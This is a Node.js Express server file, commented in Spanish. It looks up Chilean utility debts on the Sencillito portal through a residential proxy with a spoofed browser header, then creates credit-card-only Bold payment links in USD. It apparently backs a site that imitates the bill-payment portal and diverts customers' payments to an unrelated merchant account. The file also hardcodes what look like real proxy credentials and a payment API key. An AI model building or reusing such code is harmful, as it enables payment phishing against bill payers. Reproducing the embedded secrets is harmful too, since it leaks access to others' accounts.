const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Servir los archivos estáticos (HTML, CSS, JS locales)
app.use(express.static(path.join(__dirname)));

// --- CONFIGURACIÓN DE PROXY GEONODE ---
// Es recomendable mover esto a variables de entorno en producción.
const GEONODE_USER = 'geonode_PKlL1yvoTG-country-cl';
const GEONODE_PASS = '605d224e-19b6-4baa-8107-296ee7d836f5';
const GEONODE_HOST = '173.201.36.144';
const GEONODE_PORT = 9000;

// --- CONFIGURACIÓN DE BOLD ---
const BOLD_API_KEY = process.env.BOLD_API_KEY || '0APovaD1Y4Nqij7qZzIgKGD5ESERGhENu6wWATiemUg';
const BOLD_API_URL = 'https://integrations.api.bold.co/online/link/v1';

// Endpoint para consultar la deuda
app.get('/api/consultar-deuda', async (req, res) => {
    const { accountReference, utilityNumber, utilityVersion, industriaId } = req.query;

    if (!accountReference || !utilityNumber || !utilityVersion || !industriaId) {
        return res.status(400).json({ error: 'Faltan parámetros requeridos' });
    }

    try {
        // URL real de Sencillito
        const urlSencillito = `https://sencillito.com/o/portal-publico/consulta-saldo/?accountReference=${accountReference}&utilityNumber=${utilityNumber}&utilityVersion=${utilityVersion}&industriaId=${industriaId}&productTypeId=null&userId=61610&session_key=null&p_auth=UsAcGwzA`;

        // Petición usando el proxy residencial de Geonode
        const response = await axios.get(urlSencillito, {
            timeout: 15000, // Aumentamos el timeout por el proxy
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*'
            },
            proxy: {
                protocol: 'http',
                host: GEONODE_HOST,
                port: GEONODE_PORT,
                auth: {
                    username: GEONODE_USER,
                    password: GEONODE_PASS,
                },
            }
        });

        // Devolvemos la respuesta de Sencillito a nuestro frontend
        res.json(response.data);

    } catch (error) {
        console.error("Error al consultar deuda:", error.message);

        if (error.code === 'ECONNABORTED') {
            res.status(504).json({ error: 'El servidor de Sencillito tardó demasiado (Proxy Timeout)' });
        } else if (error.response) {
            res.status(error.response.status).json({
                error: 'Error desde Sencillito',
                details: error.response.data
            });
        } else {
            res.status(500).json({ error: 'Error al conectar con el proxy o el servicio' });
        }
    }
});

// ============================================
// FUNCIÓN PARA CONVERTIR CLP A USD
// ============================================
async function convertirCLPaUSD(montoCLP) {
    try {
        const response = await axios.get('https://api.exchangerate-api.com/v4/latest/CLP', {
            timeout: 10000
        });
        const tasaUSD = response.data.rates.USD;
        // Bold en USD espera centavos? No, espera el monto entero redondeado
        const montoUSD = Math.round(montoCLP * tasaUSD * 100) / 100; // 2 decimales
        const montoUSDEntero = Math.round(montoCLP * tasaUSD); // Bold espera entero
        console.log(`Conversión: ${montoCLP} CLP × ${tasaUSD} = $${montoUSD} USD`);
        return { montoUSD: montoUSDEntero, tasa: tasaUSD };
    } catch (error) {
        console.error("Error al obtener tasa de cambio:", error.message);
        // Tasa de respaldo aproximada CLP→USD (actualizar periódicamente)
        const tasaRespaldo = 0.00105;
        const montoUSD = Math.round(montoCLP * tasaRespaldo);
        console.log(`Usando tasa de respaldo: ${montoCLP} CLP × ${tasaRespaldo} = $${montoUSD} USD`);
        return { montoUSD, tasa: tasaRespaldo, respaldo: true };
    }
}

// ============================================
// ENDPOINT PARA CREAR LINK DE PAGO CON BOLD
// ============================================
app.post('/api/crear-pago', async (req, res) => {
    const { monto, descripcion, referencia, callback_url, email } = req.body;

    // Validación básica
    if (!monto || monto <= 0) {
        return res.status(400).json({ error: 'El monto es requerido y debe ser mayor a 0' });
    }

    try {
        // Convertir de CLP a USD para que el cliente vea dólares (no pesos colombianos)
        const { montoUSD, tasa, respaldo } = await convertirCLPaUSD(monto);

        // Construir el body para la API de Bold
        const boldBody = {
            amount_type: "CLOSE",
            amount: {
                currency: "USD",
                total_amount: montoUSD // Monto convertido a USD
            },
            description: descripcion || "Pago de servicio",
            // Solo tarjeta de crédito/débito para ir directo a la página de tarjeta
            payment_methods: ["CREDIT_CARD"]
        };

        // Campos opcionales
        if (referencia) {
            boldBody.reference = referencia;
        }
        if (callback_url) {
            boldBody.callback_url = callback_url;
        }
        if (email) {
            boldBody.payer_email = email;
        }

        console.log("Creando link de pago Bold:", JSON.stringify(boldBody));

        const response = await axios.post(BOLD_API_URL, boldBody, {
            timeout: 15000,
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `x-api-key ${BOLD_API_KEY}`
            }
        });

        const data = response.data;

        // Verificar que Bold respondió correctamente
        if (data.errors && data.errors.length > 0) {
            console.error("Errores de Bold:", data.errors);
            return res.status(400).json({
                error: 'Error al crear el link de pago',
                details: data.errors
            });
        }

        // Responder con el link de pago y la URL de checkout
        res.json({
            success: true,
            payment_link: data.payload.payment_link,
            checkout_url: data.payload.url,
            monto_clp: monto,
            monto_usd: montoUSD,
            tasa_cambio: tasa,
            tasa_respaldo: respaldo || false,
            message: 'Link de pago creado exitosamente'
        });

    } catch (error) {
        console.error("Error al crear link de pago Bold:", error.message);

        if (error.response) {
            console.error("Respuesta de Bold:", error.response.status, error.response.data);
            res.status(error.response.status).json({
                error: 'Error desde Bold',
                details: error.response.data
            });
        } else if (error.code === 'ECONNABORTED') {
            res.status(504).json({ error: 'Bold tardó demasiado en responder' });
        } else {
            res.status(500).json({ error: 'Error al conectar con Bold' });
        }
    }
});

// --- PUERTO PARA RENDER Y LOCAL ---
const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
    console.log(`Usando proxy Geonode: ${GEONODE_HOST}:${GEONODE_PORT}`);
    console.log(`Bold API configurada ✓`);
});
